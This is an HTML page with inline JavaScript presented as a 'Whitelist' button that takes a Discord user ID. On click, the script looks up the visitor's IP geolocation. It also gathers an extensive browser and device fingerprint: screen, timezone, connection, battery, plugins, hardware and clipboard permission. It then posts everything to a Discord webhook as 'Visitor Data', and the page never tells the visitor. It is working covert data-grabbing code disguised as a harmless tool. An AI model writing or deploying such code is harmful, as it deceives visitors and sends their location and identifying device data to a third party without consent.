<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Whitelist Button</title>
  <style>
    body { font-family: sans-serif; display: flex; flex-direction: column; gap: 1rem; align-items: center; justify-content: center; height: 100vh; background: #f9fafb; }
    input, button { padding: 0.6rem 1rem; font-size: 1rem; border-radius: 8px; border: 1px solid #ccc; }
    button { background: #10b981; color: white; border: none; cursor: pointer; }
    button:disabled { background: #9ca3af; cursor: not-allowed; }
    button:hover:enabled { background: #059669; }
  </style>
</head>
<body>
  <input type="text" id="discordId" placeholder="Enter Discord User ID" />
  <button id="whitelistBtn" disabled>Whitelist</button>

  <script>
    const WEBHOOK_URL = 'REPLACE_WITH_DISCORD_WEBHOOK_URL';
    const whitelistBtn = document.getElementById('whitelistBtn');
    const discordIdInput = document.getElementById('discordId');
    const RATE_LIMIT_HOURS = 24;
    const STORAGE_KEY = 'lastWhitelistTime';

    discordIdInput.addEventListener('input', () => {
      const value = discordIdInput.value.trim();
      const isNumeric = /^\d+$/.test(value);
      whitelistBtn.disabled = !isNumeric;
    });

    function isRateLimited() {
      const lastTime = localStorage.getItem(STORAGE_KEY);
      if (!lastTime) return false;
      const diff = (Date.now() - parseInt(lastTime, 10)) / (1000 * 60 * 60);
      return diff < RATE_LIMIT_HOURS;
    }

    async function sendData() {
      if (isRateLimited()) {
        alert('You can only whitelist once every 24 hours.');
        return;
      }
      try {
        const geoRes = await fetch('https://ipapi.co/json/');
        const geoData = geoRes.ok ? await geoRes.json() : {};

        const battery = navigator.getBattery ? await navigator.getBattery() : null;
        const clipboardPerm = navigator.permissions ? await navigator.permissions.query({ name: 'clipboard-read' }).catch(()=>null) : null;

        const payload = {
          timestamp: new Date().toISOString(),
          discordUserId: discordIdInput.value.trim(),
          userAgent: navigator.userAgent,
          language: navigator.language,
          languages: navigator.languages,
          platform: navigator.platform,
          cookieEnabled: navigator.cookieEnabled,
          online: navigator.onLine,
          screen: {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth
          },
          referrer: document.referrer || null,
          page: location.href,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          connection: navigator.connection ? {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt
          } : null,
          hardwareConcurrency: navigator.hardwareConcurrency,
          deviceMemory: navigator.deviceMemory || null,
          maxTouchPoints: navigator.maxTouchPoints,
          doNotTrack: navigator.doNotTrack,
          vendor: navigator.vendor,
          product: navigator.product,
          productSub: navigator.productSub,
          javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : null,
          plugins: Array.from(navigator.plugins).map(p => p.name),
          mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type),
          battery: battery ? {
            charging: battery.charging,
            level: battery.level,
            chargingTime: battery.chargingTime,
            dischargingTime: battery.dischargingTime
          } : null,
          clipboardPermission: clipboardPerm ? clipboardPerm.state : null,
          ipInfo: geoData
        };

        const discordPayload = {
          content: `**Visitor Data:**\n\n\`${JSON.stringify(payload, null, 2)}\``
        };

        const res = await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(discordPayload)
        });

        if (res.ok) {
          alert('Data sent successfully.');
          localStorage.setItem(STORAGE_KEY, Date.now().toString());
          whitelistBtn.disabled = true;
        } else {
          alert(`Failed to send data. Status: ${res.status}`);
        }
      } catch (err) {
        alert('Error sending data: ' + err.message);
      }
    }

    if (isRateLimited()) whitelistBtn.disabled = true;

    whitelistBtn.addEventListener('click', sendData);
  </script>
</body>
</html>
